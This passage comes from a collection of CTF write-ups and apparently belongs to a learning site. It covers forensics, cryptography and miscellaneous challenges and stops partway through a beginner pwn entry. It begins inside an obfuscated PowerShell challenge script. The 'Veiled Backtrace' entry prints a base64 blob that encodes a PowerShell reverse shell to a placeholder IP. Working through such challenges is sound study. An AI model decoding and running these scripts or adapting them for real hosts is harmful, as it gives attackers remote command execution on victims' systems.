r&#039;+&#039;i&#039;+&#039;Dmodnay&#039;+&#039;zp+yzprC1H htaP- yzp+yzp&#039;+&#039;hukz+ukztayzp+ukz+ukzyzpP-nioJ( h&#039;+&#039;taP- tnyzp+yzpetnoC-tyzp+yzukz+ukzpeS yzp+yzp;&#039;+&#039;lyzp+yzpluyzp+yzpNIiD,I&#039;+&#039;iD llehSrewoIiD,IiDSeT-vARIiD,IiDp+yzp os metsys ruo&#039;+&#039;y no eryzp+IiD,Ii&#039;+&#039;D-tuO vyzp+yzpVQ yzp+uk&#039;+&#039;z+ukzyzpIiD,IiD+]4[EMOhspu&#039;+&#039;kz+uk&#039;+&#039;zARO ( . ask ) ; -join ( VAriAblEI&#039;+&#039;iD,IiDyzp+yzpdnarC1&#039;+&#039;yzp+yzpHyukz+ukzzpIiD,IiDyzp+yzpP moyukz+ukzzp+yzpdnar nyzp+yzpur yzp+yzpttyzp+yz&#039;+&#039;pNHnodukz+ukz yzp+&#039;+&#039;yzpyletinifeDyzp+IiD,IiD]RahC[,)811]u&#039;+&#039;kz+ukzRahC[+68]R&#039;+&#039;ahC[+18&#039;+&#039;]RahC[&#039;+&#039;( eCAlper-43]RahC[,&#039;+&#039;yzpP81yzp  eCAlPeR&#039;+&#039;ukz+ukzc-69]&#039;+&#039;R&#039;+&#039;aIiD,IiD)611]Raukz+ukzhC[+87]IiD,IiDzp+yzp uoyIiD,IiDhC[&#039;+&#039;+27]&#039;+&#039;RahC[(eCAlPeRc- ukz+ukz ukz+ukz421IiD,ukz+ukzIi&#039;+&#039;D  N&#039;+&#039;7a1U -vaLUEo  )[ -1.ukz+ukz. -( ( VAr&#039;+&#039;iAblE  N7a1U IiD,IiD{TIC&#039;+&#039;P8yzp+yukz+u&#039;+&#039;kzzp1&#039;+&#039; eulaV-yzukz+ukzp+yzp )IiD,IiDyzpehweukz+ukzmyzp&#039;+&#039;+yIiD,IiDmodnayzp+yzp&#039;+&#039;ryzp+yzpCyzp+yzp1H hyzp+yzptaP-yzp+yzp myzukz+ukzp+yzpe&#039;+&#039;tI-yzp+&#039;+&#039;yzpweN ;))(gnyzp+yukz+ukzzpirtSoT.)(&#039;+&#039;diuukz+ukzGwyzp+yzIiD,IiD:ukz+ukzyzp+yzukz+ukzpIiD,IiD-vaLUEo  ).LEngtH )]olTiexIiD,IiDN:IiD,Iiukz+ukzDp&#039;+&#039;+yzp h&#039;+&#039;tyIuk&#039;+&#039;z+ukziD,ukz+ukzIiDno dnifyukz+ukzIiD,IiD,)801]RahC[+18]RahC[+511]RahCIiD,Iukz+u&#039;+&#039;kziDRaIiD,IiDC1H htaP- htaP-nioyzp+yzpJ = Iukz+ukziD,IiDpeukz+ukzIiD,IiDpukz+ukzlf eht ,syawyyzp+yzpnukz+ukza tu&#039;+&#039;B yzp+yzp.yzp+yzp.tenretni eht IiD)) -REplAceIiDolTIiD,[&#039;+&#039;CHaR]124  -REplAceIiDyzpIiD,[CHaR]39  -CREplaCE IiDAROIi&#039;+&#039;D,[ukz+ukzCHaR]36-CREplaCE ([CHaR]97+[CHaR]115+[CH&#039;+&#039;aR]107),[CHaR]3&#039;+&#039;4) &#039;+&#039;)ukz).rePLACE(([cHar]73+[cHar]105+[cHar]68),[StRiNg][cHar]39).rePL&#039;+&#039;ACE(([cHar]114+[cHar]65+[cHar]57),[StRiNg]&#039;+&#039;[cHar]36).rePLACE(([cHar]108+[cHar]98+[cHar]72),[StRiNg][cHar]34) &#039;+&#039;) QMR(  jQZ  VS&#039;(( ()&#039;X&#039;+]31[DILlehs$+]1[DILLeHS$ (&amp;&quot;  ) ; &amp; ( $pshomE[4]+$PShoME[30]+&#039;x&#039;)(-jOiN$iQboFd[ -1 ..-( $iQboFd.lenGTH ) ] )\n\nAfter you run the code in your powershell you get:\nDefinitely don&#039;t run random PowerShell you find on the internet.. But anyways, the flag is somewhere on your system so go find it!\nAnd I didn’t feel like manually searching my entire PC for the flag so I looked at the code to try and figure it out.\nThere are a lot of complicated obfuscated lines, but a couple gives us enough hints to show us what to do.\nDIABLE n7A1U (ask )IiD,IiDzp+yzpaPdlihC- yzp+ukz+ukzyzpPMET:vneIiD\nWhen deobfuscated simplifies to something like:\nSet-Variable n7A1U -Value (Join-Path $env:TEMP ...)\nSo n7A1U essentially equals env:temp\nThen you can also find:\nsetnoC-tyzp+yzukz+ukzpeS yzp+yzp;&#039;lyzp+yzpluyzp+yzpNIiD,I&#039;+&#039;iD llehSrewoIiD,IiDSeT-vARIiD,IiDp+yzp ...\n...\n(-jOiN$iQboFd[ -1 ..-( $iQboFd.lenGTH ) ] )\n\nWhich when deobfuscated simplifies to something like:\nSet-Content -Path $n7A1U -Value (-join $iQboFd[-1..-$iQboFd.Length])\nSo we’re saving/setting the content of some text into the path at n7A1U aka env:temp as we found before.\nSo I then started looking through my env:temp path for the most recent file/folder and found:\nC:\\Users\\username\\AppData\\Local\\Temp\\f19d9e39-4e8f-4b59-85ee-feb8fc5a5d52\nAnd inside I found a flag.txt.\nFlag\nInside the flag.txt I found the correct flag:\nCIT{th1s_a1nt_m4lw4r3_d0nt_w0rry}"},"WRITEUPS/CITCTF/True-CTF-Love":{"slug":"WRITEUPS/CITCTF/True-CTF-Love","filePath":"WRITEUPS/CITCTF/True CTF Love.md","title":"True CTF Love","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription\nTrue CTF love\nForensics\nWorth 552 Points\nBy boom\n\nI got this strange email from another CTF participant not too long ago. I am just not sure what they mean by this…\nDo you love CTFs as much as they do?\nSHA256: 07cb654ce87444f158a52228848eb4eb501738913dfca44a2f227fb73ee9ed4b\nThen attached is a The_Flag_Well_Capture_Together.eml file.\nSolution\nAfter opening the eml file as a txt file you get:\nReturn-Path: &lt;ilovectfs19@waifu.club&gt;\nDelivered-To: idespisectfs14@memeware.net\nReceived: by mx1.mailhub.li (Postfix, from userid 65534)\n\tid 531FD380054; Tue, 22 Apr 2025 16:29:02 +0000 (UTC)\nX-Spam-Checker-Version: SpamAssassin 3.4.2 (2018-09-13) on 4e7ad924bcc3\nX-Spam-Level: \nX-Spam-Status: No, score=-1.3 required=5.0 tests=ALL_TRUSTED,BAYES_00,\n\tDKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,URIBL_BLOCKED,URIBL_SBL_A,\n\tURIBL_WS_SURBL shortcircuit=_SCTYPE_ autolearn=disabled version=3.4.2\nReceived: from mail.mailhub.li (unknown [10.69.4.14])\n\tby mx1.mailhub.li (Postfix) with ESMTPS id 98762380048\n\tfor &lt;idespisectfs14@memeware.net&gt;; Tue, 22 Apr 2025 16:29:00 +0000 (UTC)\nAuthentication-Results: mx1.mailhub.li;\n\tdkim=pass (2048-bit key; unprotected) header.d=waifu.club header.i=@waifu.club header.b=&quot;e65uxTcZ&quot;;\n\tdkim-atps=neutral\nMIME-Version: 1.0\nDKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=waifu.club; s=mail;\n\tt=1745339340; bh=HSq3Fk4UngoT3615kRTwX9TQfq9o0GNk3L5esFLg2e4=;\n\th=Date:From:To:Subject:From;\n\tb=e65uxTcZ2s8RKde5x7GoMWDhM27qMUa2vpmCC6uPR/kCsC5Tl1lgVNCik9TBiIn7xThMSG0m17ElJR+eQ3IFACqhDjoJkCdLo+iYAwvx4Go1OOYUYRx7dn7tUisIKy2p7NsDjJMauF8H1fwIpO6kFZKUPiPescPp6mBJIWBOARUNxRSSReBJv+B8GibZJbN4c64c0 wOVpmrc1P3sGs/K1i8sjzcHVJyNdBBV2e71n5gJFfbo5EkM/HSmba8Vvfdg2BGkVaYOriRs9vs5+XwV8v9stPhL48avJipOSz1ykfbXW3//QZYpAOGyQz8lhE2cek5YLJulB yO/Pz8vtbkwjA==\n\tb=V293LCB3aGF0IGEgYmVhdXRpZnVsIGxpdHRsZSBwb2VtLiBJIGFsbW9zdCBzaGVkIGEgdGVhciByZWFkaW5nIHRoYXQuIEhvcGVmdWxseSB5b3UgbGVhcm5lZCBtb3JlIGFib3V0IGVtYWlsIGhlYWRlcnMuIEJ1dCBzZXJpb3VzbHksIGl0IGdldHMgbWUgd29uZGVyaW5nLi4uIGRvIHlvdSBsb3ZlIENURnMgYXMgbXVjaCBhcyB0aGV5IGRvPwoKQ0lUe2lfbDB2M19jdGYkX3QwMH0=\n\t\nContent-Type: text/plain; charset=UTF-8;\n format=flowed\nContent-Transfer-Encoding: 8bit\nDate: Tue, 22 Apr 2025 12:29:00 -0400\nFrom: ilovectfs19@waifu.club\nTo: idespisectfs14@memeware.net\nSubject: =?UTF-8?Q?The_Flag_We=E2=80=99ll_Capture_Together?=\nUser-Agent: Roundcube Webmail/1.4.15\nMessage-ID: &lt;94db41ae58ad070173fc571e2008de8b@waifu.club&gt;\nX-Sender: ilovectfs19@waifu.club\n\nMy dearest one, whose heart I hold,\nIn your eyes, I see a world untold.\nWhere logic and riddles dance like stars,\nBut you, my love, stand behind bars.\n\nI know you don’t share in my joy,\nThe flags I chase, the games I deploy.\nYou sigh, you frown, and often retreat,\nWhile I dive into challenges, so sweet.\n\nBut, oh, my love, can you see?\nThese puzzles are not just code to me.\nThey’re like whispers from a distant shore,\nA challenge to unlock, a path to explore.\n\nI dream of the day when you’ll join the chase,\nAnd feel the thrill of solving with grace.\nNot because you have to, but because you’ll find,\nThe joy in puzzles that ignites your mind.\n\nI won’t push, I won’t rush,\nNo, I’ll be gentle, soft as a hush.\nBut if you ever wish to see what I see,\nI’ll be here, waiting, with a flag for you and me.\n\nTogether, we can solve what’s unknown,\nIn the world of CTFs, you won’t be alone.\nLet’s take it slow, no need to fear,\nFor love is the answer, my darling, my dear.\n\nSo, when you&#039;re ready, just take my hand,\nLet’s solve the puzzle, make our stand.\nAnd who knows, perhaps you’ll see—\nThat even CTFs, too, can be love’s key.\n\nA lot of this is garbage and can completely be ignored, but there are some interesting lines, specifically in the DKIM header.\nUsually in a DKIM header, there’s only one signature (The ‘b=’) but take a look at the eml file and we have two signatures which is suspicious.\nLooking at the signatures they both look like base64.\nThe first one when decoded gives:\n{®nÅ7\u0019ÚÏ\u0011)×¹Ç±¨1`á3nê1F¶¾™‚\u000b«Gù\u0002°.S—Y`TÐ¢“ÔÁˆ‰ûÅ8LHm&amp;×±%%\u001fžCr\u0005�*¡\u000e:\t&#039;K£è˜\u0003\u000bñàj58æ\u0014a\u001c{v~íR+\b+-©ìÛ\u0003Œ“\u001a¸_\u0007Õü\b¤î¤\u0015’”&gt;#Þ±Ãéê`I!`N\u0001\u0015 Å\u0014’EàI¿à|\u001a&amp;Ù%³xs®\u001cÓ\u0003•¦jÜÔýì\u001aÏÊÖ/,7\u0007Tœt\u0010UÙîõŸ˜\t\u0015öèäI\füt¦m¯\u0015½÷`Ø\u0011¤U¦\u000e®$löû9ù|\u0015òÿløKãÆ¯&amp;*NK=r‘ö×[ÿA–)�á²C?%„MœzNX,›¥\u0007#¿??/µ¹0Œ\nwhich is complete gibberish, but by decrypting:\nV293LCB3aGF0IGEgYmVhdXRpZnVsIGxpdHRsZSBwb2VtLiBJIGFsbW9zdCBzaGVkIGEgdGVhciByZWFkaW5nIHRoYXQuIEhvcGVmdWxseSB5b3UgbGVhcm5lZCBtb3JlIGFib3V0IGVtYWlsIGhlYWRlcnMuIEJ1dCBzZXJpb3VzbHksIGl0IGdldHMgbWUgd29uZGVyaW5nLi4uIGRvIHlvdSBsb3ZlIENURnMgYXMgbXVjaCBhcyB0aGV5IGRvPwoKQ0lUe2lfbDB2M19jdGYkX3QwMH0=\nYou get something interesting.\nFlag\nAfter decryption you get:\nWow, what a beautiful little poem. I almost shed a tear reading that. Hopefully you learned more about email headers. But seriously, it gets me wondering... do you love CTFs as much as they do?\nCIT{i_l0v3_ctf$_t00}\n\nWhich includes at the end the correct flag:\nCIT{i_l0v3_ctf$_t00}"},"WRITEUPS/CITCTF/We-lost-the-flag":{"slug":"WRITEUPS/CITCTF/We-lost-the-flag","filePath":"WRITEUPS/CITCTF/We lost the flag.md","title":"We lost the flag","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription\nWe lost the flag\nForensics\nWorth 655 Points\nBy boom\n\nSorry everyone, we unfortunately lost the flag for this challenge.\nSHA256: d1058ed414e6e45f4d2c7cc41baf73b3778a80be18cdf2d6470348c72ab01dfd\nThen attached is a corrupted file lost.png\nSolution\nWhen you initially try to open the png, it appears that it is corrupted/broken, so we have to take a closer look at it.\nSo, by using hexedit lost.png, we’re able to see the problem with the image:\n\nInstead of this being a png as it’s named, it’s actually a JPEG so trying to open it as a png definitely won’t work, so we can simply rename the file to lost.jpg\nBut, now if we try to open it we’ll get a error still that the file is corrupted. So, looking at the Hex again, or using jpeginfo in order to diagnose it, we find that this isn’t a valid jpeg because it starts with 0x00 0xc2 whereas for a proper jpeg it’s expected to start with FF D8\nSo using hexedit again in order to edit the first two values we get:\n\nFlag\nNow when we try to open lost.jpg we get\n\nWhich contains the correct flag:\nCIT{us1ng_m4g1c_1t_s33m5}"},"WRITEUPS/CITCTF/Welcome-to-CTF@CIT!":{"slug":"WRITEUPS/CITCTF/Welcome-to-CTF@CIT!","filePath":"WRITEUPS/CITCTF/Welcome to CTF@CIT!.md","title":"Welcome to CTF@CIT!","links":[],"tags":[],"content":"Description\nWelcome to CTF@CIT!\nWelcome\nWorth 10 Points\n\nWelcome to the second annual CTF@CIT!\nPlease remember to familarize yourself with the rules, check out our sponsors, but most importantly remember to have fun and learn something new this weekend!\nThe flag format for all challenges will be CIT{} unless noted otherwise\nWe are using dynamic scoring to automatically balance the point reward for every challenge. Each challenge will start with 1,000 points and will go down every solve. This point reduction will reduce points for everyone who has already solved the challenge too, so don’t worry if you see your points go down. This was used so the amount of solves on the challenge would determine how many points it’s worth instead of us arbitrarily choosing numbers. By the end of the competition, every challenge should be worth a fair amount of points depending on how difficult it is.\nFlag: CIT{welcome2025}\nSolution\nAfter looking through the challenge description very carefully, I noticed some odd text with separate meaning from the rest of the description ‘Flag:‘\nFlag\nAnd after looking next to ‘Flag’ you find the correct flag:\nCIT{welcome2025}"},"WRITEUPS/CITCTF/What-am-I-Hearing":{"slug":"WRITEUPS/CITCTF/What-am-I-Hearing","filePath":"WRITEUPS/CITCTF/What am I Hearing.md","title":"What am I Hearing","links":["CTF/Misc/Miscellaneous"],"tags":[],"content":"Miscellaneous\nDescription\nWhat am I Hearing\nMisc\nWorth 941 Points\n\nBro what am I hearing rn\nFlag Format: CIT{example_flag}\nAnd attached is this wav file:\n\nSolution\nAfter listening to the wav file, it’s pretty obvious that it’s morse code.\nSo I used morsefm.com/ in order to quickly decode it and I got:....................!?.?...?.......?....................?.?.?.!!?!.?.?.?!!!!!!!.............!.......................!..?..............................................!.!!!.?.!!!!!!!!!!!!!!!!!!!!!!!!!!!.!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!.........!..?!!!!!!!!!!!!!!!!!.?.!!!!!!!!!!!!!.........................................!.!!!!!!!!!.................................!.?.................................................!..?..........!..?!!!!!!!!!...............................!.\nWhich at first seems like nothing, but it’s too precise to be nothing as there weren’t morse code translation errors they specifically were coded to . ! and ?\nAnd when you have seemingly random periods, exclamation points, and question marks you can guess it’s the stupid programming language only used to mess up people in CTFs: Ook!\nFlag\nSo, using www.dcode.fr/ook-language I input the decoded morse code and got the correct flag:\nCIT{zG48r2FBR6Wn}"},"WRITEUPS/JerseyCTF/Frequencies-of-Deception":{"slug":"WRITEUPS/JerseyCTF/Frequencies-of-Deception","filePath":"WRITEUPS/JerseyCTF/Frequencies-of-Deception.md","title":"Frequencies-of-Deception","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription\nFrequencies-of-Deception\nForensics\nWorth 822 Points\nEasy\nBy Trent\n\nAn intercepted audio transmission carries a veiled warning. Some say it’s just noise, others believe it’s the key to an unsolved mystery. Use your forensic skills to dissect the frequencies and uncover the message lurking in the static. Flag format jctf{}\nNote: For this challenge the flag format is NOT jctfv{} but is instead jctf{}\nThen it had an attached ‘unknown.wav’ file\n\nSolution\nAfter listening to the wav file, I immediately recognized it as those old dial tones where each tone corresponded to a certain number/symbol (I can’t believe this is considered old now). So I knew that I somehow had to decipher what tones corresponded with which numbers/symbols and had to collect them somehow.\nI asked my teammates if they knew any program that could decipher this and Wxrth led me to a dtmf-detector, that led me to a nice app dtmf.netlify.app/\nWith that, I put in my unknown.wav file and left the sensitivity as 0.050 and got a nice output of\n**Decodedn\nI recognized that output as ASCII code so I then put it into an ASCII decoder and got:\n01100100 01001111 01101110 01010100 01011111 01000011 00110000 01101101 01100101 01011111 00100100 01110100 01000001 01011001 01011111 01100001 01010111 01000000 01011001 01011111 01000110 01110010 00110000 01001101 01011111 01110100 01101000 00100001 01110011 01011111 01010000 01101100 01000000 01100011 01000101\n\nWhich I recognized as binary code, so I put that into Binary to text decoder and got:\ndOnT_C0me_$tAY_aW@Y_Fr0M_th!s_Pl@cE\nFlag\nI then wrapped that with the specific flag format for Frequencies-of-Deception and got the correct flag:\njctf{dOnT_C0me_$tAY_aW@Y_Fr0M_th!s_Pl@cE}"},"WRITEUPS/JerseyCTF/Prng-Pred":{"slug":"WRITEUPS/JerseyCTF/Prng-Pred","filePath":"WRITEUPS/JerseyCTF/Prng-Pred.md","title":"Prng-Pred","links":["CTF/Cryptography/Cryptography","CTF/Cryptography/Ciphers/XOR-Cipher"],"tags":[],"content":"Cryptography XOR Cipher\nDescription\nPrng-Pred\nCryptography\nWorth 919 Points\nHard\nBy KDShetty11\n\nWe created a custom random number generator using XOR-Shift to help us generate pseudorandom numbers. THere may have been an issue with our initialization. Here are the first 5 generated values. Can you predict the next one?\nprng-pred.aws.jerseyctf.com:5000/\nThe link led to a website that looked like this:\n\nSolution\nThe problem provided five sequential outputs from an XOR-Shift based pseudorandom number generator (PRNG) with the goal to determine the next number in the sequence. I realized that because XOR-Shift generators are deterministic, we could infer the shift parameters used in the PRNG, so we could predict the next number\nThat led to me developing the following program:\nUsing the given sequence ‘2796150728, 1619295863, 4160883531, 3273899421, 3467984294’ I brute-force all reasonable values for the shift parameters a, b, c\n(Note the generated sequence is different every time you load the page, so you have to edit the progam accordingly)\ndef xorshift(x, a, b, c):\n\n    # Perform the XOR-shift steps with given shift parameters.\n\n    # All operations are done on 32-bit unsigned integers.\n\n    x ^= (x &lt;&lt; a) &amp; 0xFFFFFFFF\n\n    x ^= (x &gt;&gt; b)\n\n    x ^= (x &lt;&lt; c) &amp; 0xFFFFFFFF\n\n    return x &amp; 0xFFFFFFFF\n\n  \n\n# Given sequence\n\nsequence = [2796150728, 1619295863, 4160883531, 3273899421, 3467984294]\n\n  \n\n# We&#039;ll search for shift parameters a, b, c in a reasonable range (e.g. 1 to 31)\n\nvalid_parameters = []\n\n  \n\nfor a in range(1, 32):\n\n    for b in range(1, 32):\n\n        for c in range(1, 32):\n\n            valid = True\n\n            x = sequence[0]\n\n            # Test if the recurrence holds for the entire provided sequence.\n\n            for expected in sequence[1:]:\n\n                x = xorshift(x, a, b, c)\n\n                if x != expected:\n\n                    valid = False\n\n                    break\n\n            if valid:\n\n                # Compute the next value using these parameters.\n\n                next_val = xorshift(sequence[-1], a, b, c)\n\n                valid_parameters.append(((a, b, c), next_val))\n\n  \n\nif valid_parameters:\n\n    print(&quot;Found valid shift parameters and their predicted next values:&quot;)\n\n    for params, next_val in valid_parameters:\n\n        print(f&quot;Shift parameters a, b, c = {params} --&gt; Next value = {next_val}&quot;)\n\nelse:\n\n    print(&quot;No valid shift parameters found in the tested range.&quot;)\n\nAfter running the script, it output:\nFound valid shift parameters and their predicted next values:\nShift parameters a, b, c = (13, 7, 17) --&gt; Next value = 2506751581\n\n\nFlag\nAfter inputting 2506751581 into the website it confirmed that my prediction was right and outputted the flag:\njctfv{Predictable_PRNG_Rizzed}"},"WRITEUPS/JerseyCTF/Read-the-Rules":{"slug":"WRITEUPS/JerseyCTF/Read-the-Rules","filePath":"WRITEUPS/JerseyCTF/Read the Rules.md","title":"Read the Rules","links":[],"tags":[],"content":"Worth 1 pt\nJerseyCTF V Rules\nPlease open the attached pdf, and read the rules and terms &amp; conditions to gain access to all the challenges for JerseyCTF V (the flag is in the pdf)\nNotes for the JerseyCTF V\nPlease note that all flags are case sensitive, and unless otherwise specified in the challenge description, follow the format shown below:\nFlag format for JerseyCTF V : jctfv{answer_flags_like_this}\nAfter reading the rules, I figured I had to read the attached PDF in order to find the flag (Quite the forensics challenge)\nAfter parsing through the attached pdf file, I found the following at the very bottom of the third page after much searching and suffering: jctfv{i_agree_to_the_rules}\nAnd luckily, it was the right flag!\n"},"WRITEUPS/JerseyCTF/The-Hidden-Key":{"slug":"WRITEUPS/JerseyCTF/The-Hidden-Key","filePath":"WRITEUPS/JerseyCTF/The-Hidden-Key.md","title":"The-Hidden-Key","links":["CTF/Cryptography/Cryptography","CTF/Cryptography/Ciphers/RSA-Cipher"],"tags":[],"content":"Cryptography RSA Cipher\nDescription\nThe-Hidden-Key\nCryptography\nWorth 100 points\nEasy\nBy Dylan\n\nAn anonymous party was using Wireshark looking network activity and stumbled across this encrypted text, they then notified NICC and sent the file. This could be a key to something.\nThen it had a link download to a ‘TheHiddenKey.txt’ file which contained:\nn: 20167919\ne: 65537\nct: [10254726, 8086048, 6236280, 17208595, 10736836, 5882601, 15516508, 7658876, 2682380, 10736836, 15449006, 6236280, 11933731, 5504792, 922598, 11933731, 758869, 5504792, 17208595, 4826125, 7658876, 5504792, 2682380, 4744868, 12442849, 4826125, 7658876, 1039218, 15449006, 6236280, 2682380, 4826125, 4744868, 4111665]\n\nSolution\nImmediately after seeing the txt file I recognized it as an RSA cipher because of the recognizable Public Key Value, e, and Ciphertext.\nSo, in order to solve the RSA you have to follow the following steps for each ciphertext:\n\nFactorize n to find p and q\nCompute ϕ(n)=(p−1)(q−1)\nFind d as the modular inverse of e modulo ϕ(n)\nCompute m = c^d mod(n)\nUse m and the ASCII alphabet to find what letter each ciphertext corresponds to\n\nI then wrote a simple program that ran through the above steps for each of the ciphertexts\nfrom sympy import isprime, gcdex\n\nfrom math import isqrt\n\n  \n\ndef factorize_n(n):\n\n    for i in range(2, isqrt(n) + 1):\n\n        if n % i == 0:\n\n            p, q = i, n // i\n\n            if isprime(p) and isprime(q):\n\n                return p, q\n\n    return None, None\n\n  \n\ndef modinv(e, phi):\n\n    d, _, _ = gcdex(e, phi)\n\n    return d % phi\n\n  \n\ndef rsa_decrypt(n, e, ct):\n\n    p, q = factorize_n(n)\n\n    if not p or not q:\n\n        raise ValueError(&quot;Failed to factorize n&quot;)\n\n    phi = (p - 1) * (q - 1)\n\n    d = int(modinv(e, phi))\n\n  \n\n    decrypted = [pow(c, d, n) for c in ct]\n\n    return &#039;&#039;.join(chr(m) for m in decrypted)\n\n  \n\n# Given values\n\nn = 20167919\n\ne = 65537\n\nct = [10254726, 8086048, 6236280, 17208595, 10736836, 5882601,\n\n      15516508, 7658876, 2682380, 10736836, 15449006, 6236280, 11933731,\n\n      5504792, 922598, 11933731, 758869, 5504792, 17208595, 4826125,\n\n      7658876, 5504792, 2682380, 4744868, 12442849, 4826125, 7658876,\n\n      1039218, 15449006, 6236280, 2682380, 4826125, 4744868, 4111665]\n\n  \n\n# Decrypt and print the message\n\ntry:\n\n    decrypted_message = rsa_decrypt(n, e, ct)\n\n    print(&quot;Decrypted message:&quot;, decrypted_message)\n\nexcept ValueError as err:\n\n    print(&quot;Error:&quot;, err)\n\nFlag\nAfter running the above code, it output the correct flag:\njctfv{Pr1v@t3_k3y_f0r_1nF0rm@t10n}"},"WRITEUPS/JerseyCTF/The-Veiled-Backtrace":{"slug":"WRITEUPS/JerseyCTF/The-Veiled-Backtrace","filePath":"WRITEUPS/JerseyCTF/The-Veiled-Backtrace.md","title":"The-Veiled-Backtrace","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription\nThe-Veiled-Backtrace\nForensics \nWorth 930 Points \nEasy \nBy Trent\n\nA hard drive full of photos. Hundreds of still frames, nothing out of the ordinary. But something’s tucked away — veiled, deliberate. One image holds more than meets the eye. Peel back the layers. Follow the trace.\nFlag format: jctf{IP:Port} Note: For this challenge the flag format is NOT jctfv{} but instead jctf{} Note: The IP is not a valid/real IP, this is for your protection.\nAnd it had a download link to ‘archive.zip’ which contained 100 jpg files and 1 ’…’ file.\n\nSolution\nInitially, because this was a forensics challenge, I thought I had to go through each image in order to find some sort of hidden data, so I spent ~30 minutes putting the jpgs through exiftool in order to find anything, but came up with nothing.\nThen I realized (After way too long) that there was a non-jpg file in the zip: ’…’\nAfter opening ’…’ it gave:\nÿØÿàZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzY3OC40NjIuMTQ2LjMzNCcsIDg3ODkpOyROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTskU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pO2Z1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHtbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gMC4uJFRDUENsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZSB8ICUgezB9OyRTdHJlYW1Xcml0ZXIuV3JpdGUoJFN0cmluZyArICdTSEVMTD4gJyk7JFN0cmVhbVdyaXRlci5GbHVzaCgpfVdyaXRlVG9TdHJlYW0gJyc7d2hpbGUoKCRCeXRlc1JlYWQgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKSkgLWd0IDApIHskQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7JE91dHB1dCA9IHRyeSB7SW52b2tlLUV4cHJlc3Npb24gJENvbW1hbmQgMj4mMSB8IE91dC1TdHJpbmd9IGNhdGNoIHskXyB8IE91dC1TdHJpbmd9V3JpdGVUb1N0cmVhbSAoJE91dHB1dCl9JFN0cmVhbVdyaXRlci5DbG9zZSgpIg== \nWhich after seeing it ending with == I immediately recognized it as base64 code, and after decrypting it, it gave:\nNet.Sockets.TCPClient(&#039;678.462.146.334&#039;, 8789)\n(Note it gave a lot more text, but whenever I put that into this file, Windows considered it a trojan horse and completely wiped this folder)\nAnd from that I noticed what the flag format was trying to get:\njctf{IP:Port} Note: The IP is not a valid/real IP, this is for your protection\nFlag\nSo after putting them together I got the flag\n“jctf{678.462.146.334:8789}”"},"WRITEUPS/JerseyCTF/evtx":{"slug":"WRITEUPS/JerseyCTF/evtx","filePath":"WRITEUPS/JerseyCTF/evtx.md","title":"evtx","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription\nevtx\nForensics\nWorth 453 Points\nEasy\nBy Jan\n\nIt appears that one of the low-level grunts of the NICC organization have gone rogue. They keep trying to get into a user’s account by guessing their password. Can you tell us 1. the name of the user who is being targeted with brute force password guessing attempts and 2. the number of times the rogue user has tried to get into the account? The flag should have the format jctfv{Name_Number} where Name is the username and Number is the count.\nIt then had a download to a ‘evtx.zip’ which contained a Windows XML EventLog file ‘chal.evtx’\nIn that file, it contained 141 different events\n\nSolution\nAfter looking through every event, I found that all events with Event ID 4625 corresponded to a failed log on which is what I need for the flag.\nSo, there 17 different instances of failed logons, but they weren’t necessarily brute force failed attempts, they could’ve been a regular user just mis-entering their password, so I had to dig a little deeper.\n\nAfter inspecting each of the failed attempts, I was able to see that odds are, the brute force attempts went from\n1:28:16 to 1:29:04\nSo I inspected each of the attempts between 1:28:16 and 1:29:04 and each of them looked very similar to:\n\nand were all targeted at User500, whereas any of the failed login attempts after 1:29:04 looked similar to:\n\n\nand were targeted at random users, which made me think these were just accidental failed-logons\nSo, I counted each of the failed logon attempts on User500 between 1:28:16 and 1:29:04 and found there were 11 attempts.\nFlag\nI then took User500 and 11, and put it into the flag format for this questions: jctfv{Name_Number} and got the correct flag:\njctfv{User500_11}"},"WRITEUPS/SwampCTF/Beginner-Pwn-1":{"slug":"WRITEUPS/SwampCTF/Beginner-Pwn-1","filePath":"WRITEUPS/SwampCTF/Beginner Pwn 1.md","title":"Beginner Pwn 1","links":["CTF/Pwn/Pwn"],"tags":[],"content":"Pwn\nDescription\nBeginner Pwn 1\nPwn\nWorth 25 Points\n\nAre you really admin?\nThis challenge serves as an introduction to pwn that new ctfers can use to grasp basic pwn concepts.\nnc chals.swampctf.com 40004\nIt also had a download link to a ‘is_admin’ file and a ‘main.c’ file.\n(main.c file)\n#include &lt;stdio.h&gt;\n\n#include &lt;stdint.h&gt;\n\n#include &lt;stdbool.h&gt;\n\n  \n\nint print_stack(uint8_t *stack, uint32_t size){\n\n    printf(&quot;--- Print Stack ---\\n&quot;);\n\n  \n\n    while(size !=  -1) {\n\n        printf(&quot;0x%02x (%c)&quot;, stack[size], stack[size]);\n\n        if(size &lt;= 9) {\n\n            printf(&quot; = username[%d]\\n&quot;, size);\n\n        } else if(size &gt; 9 &amp;&amp; size &lt;= 13) {\n\n            printf(&quot; = is_admin[%d]\\n&quot;, size - 10);\n\n        } else {\n\n            printf(&quot;\\n&quot;);\n\n        }\n\n        size -= 1;\n\n    }\n\n    printf(&quot;--- End Print ---\\n&quot;);\n\n}\n\n  \n\nvoid print_flag(){\n\n    FILE *fptr;\n\n    char flag[35] = {0};\n\n  \n\n    fptr = fopen(&quot;flag.txt&quot;, &quot;r&quot;);\n\n    fread(flag, 